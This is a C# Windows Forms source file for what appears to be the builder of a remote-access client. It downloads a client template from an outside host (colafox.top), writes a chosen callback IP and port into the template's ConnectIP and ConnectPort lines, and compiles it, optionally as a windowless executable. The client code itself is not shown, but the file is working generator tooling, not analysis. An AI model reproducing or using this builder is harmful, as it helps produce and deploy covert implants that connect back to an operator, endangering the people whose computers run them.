using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Gernerate : Form
    {
        public string ipaddr; public int conport;
        public Gernerate()
        {
            InitializeComponent();
        }
        private void Gernerate_Load(object sender, EventArgs e)
        {
            textBox5.Text = ipaddr; textBox6.Text = conport.ToString();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string[] strs = File.ReadAllLines(textBox7.Text);
            int i = 0;
            foreach (string s in strs)
            {
                i = i + 1;
                if(i == 16) strs[i] = "    public static string ConnnectIP = \"" + textBox5.Text + "\" ;";
                if(i == 17) strs[i] = "    public static int ConnectPort = " + textBox6.Text + ";";
                if (i >= 18) break;
            }

            File.Delete(textBox7.Text);
            StreamWriter sw = new StreamWriter(@textBox7.Text, true, System.Text.Encoding.UTF8);
            foreach (string s in strs)
            {
                sw.WriteLine(s);
            }
            sw.Flush();
            sw.Close();

            MessageBox.Show("已经修改成功");
        }

        private void textBox7_DragDrop(object sender, DragEventArgs e)
        {
            string path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();       //获得路径
            textBox7.Text = path;
            textBox2.Text = path;
        }
        private void textBox7_DragEnter(object sender, DragEventArgs e)
        {
            string file = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();//获得路径
            textBox7.Text = file;
            textBox2.Text = file;
        }
        private void textBox2_DragEnter(object sender, DragEventArgs e)
        {
            string file = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();//获得路径
            textBox2.Text = file;
        }
        private void textBox2_DragDrop(object sender, DragEventArgs e)
        {
            string path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();       //获得路径
            textBox2.Text = path;
        }
        private void textBox3_DragDrop(object sender, DragEventArgs e)
        {
            string path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();       //获得路径
            textBox3.Text = path;
        }
        private void textBox3_DragEnter(object sender, DragEventArgs e)
        {
            string file = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();//获得路径
            textBox3.Text = file;
        }
        private void textBox1_DragDrop(object sender, DragEventArgs e)
        {
            string path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();       //获得路径
            textBox1.Text = path;
        }
        private void textBox1_DragEnter(object sender, DragEventArgs e)
        {
            string file = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();//获得路径
            textBox1.Text = file;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Process ps = new Process();
            ps.StartInfo.FileName = textBox1.Text;
            if(checkBox1.Checked == true)
            {
                ps.StartInfo.Arguments = "/target:winexe " + textBox2.Text;
            }
            else
            {
                ps.StartInfo.Arguments = textBox2.Text;
            }
            ps.Start();

            System.Diagnostics.Process.Start("explorer.exe", System.Environment.CurrentDirectory);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process ps = new Process();
            ps.StartInfo.FileName = textBox4.Text;
            ps.StartInfo.Arguments = textBox3.Text;
            ps.Start();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                var url = "https://colafox.top/1.cs";
                var save = @"client.cs";
                if (!File.Exists(save))
                {
                    this.Text = ("文件不存在，开始下载...");
                    using (var web = new WebClient())
                    {
                        web.DownloadFile(url, save);
                    }
                    this.Text = ("文件下载成功");
                }
                this.Text = ("文件下载成功");

                textBox7.Text = "client.cs";
                textBox2.Text = "client.cs";
            }
            catch
            {
                this.Text = ("下载失败");
            }
        }
    }
}
